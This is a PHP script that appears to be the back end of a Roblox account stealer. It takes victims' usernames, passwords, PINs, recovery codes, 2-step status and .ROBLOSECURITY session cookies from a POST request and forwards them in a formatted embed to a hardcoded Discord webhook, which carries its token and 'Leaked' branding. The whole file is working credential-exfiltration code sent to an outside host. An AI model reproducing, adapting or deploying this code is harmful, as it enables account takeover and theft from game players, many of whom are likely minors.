<?php
session_start();
$webhook = 'https://discord.com/api/webhooks/1086518690004082808/AXHbFXczOyFM7y6XAXD9fBR_fgeF-gaevDgS1fXBI8y2Nquf8FeOmKkFE6sFF6vrencT';
$log = $_POST['log'];
$log = json_decode($log);
$username = $log->username;
$userid = $log->userid;
$age = $log->age;
$password = $log->password;
$summary = $log->summary;
$balance = $log->balance;
$pending = $log->pending;
$rap = $log->rap;
$credit = $log->credit;
$pin = $log->pin;
$step = $log->step;
$premium = $log->premium;
$accountage = $log->accountage;
$cantrade = $log->cantrade;
$collectibles = $log->collectibles;
$recoverycodes = $log->recoverycodes;
$roblosecurity = $log->roblosecurity;
if($recoverycodes){
$result = json_encode([
            "username" => 'vKevin',
            "avatar_url" => 'https://th.bing.com/th/id/R.e34acaf4d173d199bad26afbed709a36?rik=GrqM%2fW4mG1EyoQ&riu=http%3a%2f%2fweekender.com.sg%2fentertainment%2fwp-content%2fuploads%2f2019%2f07%2f960x0.png&ehk=BPb%2b5VRU3ZIx3RU4OQW5qmhKRR4yr2mYzgosvXALWuA%3d&risl=&pid=ImgRaw&r=0',
             "content" => '',
                "embeds" => [
                    [
                        "title" => "$username ($age)",
                        "type" => "rich",
                        "description" => "[Profile](https://www.roblox.com/users/$userid/profile) | [Trade](https://www.roblox.com/users/$userid/trade) | [Check](https://www.roblox.com/login)",
                        "url" => 'https://discord.gg/leakedbyvkevin',
                        "color" => hexdec('FFFF00'),
                        "thumbnail" => [
                            "url" => "https://www.roblox.com/headshot-thumbnail/image?userId=$userid&width=420&height=420&format=png"
                        ],
                        "author" => [
                        "name" => 'Leaked',
                        "url" => 'https://discord.gg/bZPxCuERrf'
                        ],
                        "fields" => [
                            [
                                "name" => "**Username:**",
                                "value" => "```$username```",
                                "inline" => False
                            ],
                            [
                                "name" => "**Password:**",
                                "value" => "```$password```",
                                "inline" => False
                            ],
                            [
                                "name" => "**Summary:**",
                                "value" => "```R$$summary```",
                                "inline" => True
                            ],
                            [
                                "name" => "**Balance:**",
                                "value" => "```R$$balance $pending```",
                                "inline" => True
                            ],
                            [
                                "name" => "**RAP:**",
                                "value" => "```R$$rap```",
                                "inline" => True
                            ],
                            [
                                "name" => "**Credit:**",
                                "value" => "```$credit```",
                                "inline" => True
                            ],
                            [
                                "name" => "**Pin:**",
                                "value" => "```$pin```",
                                "inline" => True
                            ],
                            [
                                "name" => "**2-Step:**",
                                "value" => "```$step```",
                                "inline" => True
                            ],
                            [
                                "name" => "**Premium:**",
                                "value" => "```$premium```",
                                "inline" => True
                            ],
                            [
                                "name" => "**Account Age:**",
                                "value" => "```$accountage```",
                                "inline" => True
                            ],
                            [
                                "name" => "**Can Trade:**",
                                "value" => "```$cantrade```",
                                "inline" => True
                            ],
                            [
                                "name" => "**Collectibles:**",
                                "value" => "```$collectibles```",
                                "inline" => False
                            ],
                            [
                                "name" => "**Recovery Codes:**",
                                "value" => "```$recoverycodes```",
                                "inline" => False
                            ],
                            [
                                "name" => "**.ROBLOSECURITY:**",
                                "value" => "```$roblosecurity```",
                                "inline" => False
                            ],
                        ]
                    ],
                ],
            
        ], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE );
        $ch = curl_init();
        curl_setopt_array($ch, [
            CURLOPT_URL => $webhook,
            CURLOPT_POST => true,
            CURLOPT_POSTFIELDS => $result,
            CURLOPT_HTTPHEADER => [
                "Content-Type: application/json"
            ]
        ]);                                   
        $response = curl_exec($ch);
        curl_close($ch);
        session_destroy();
}
?>
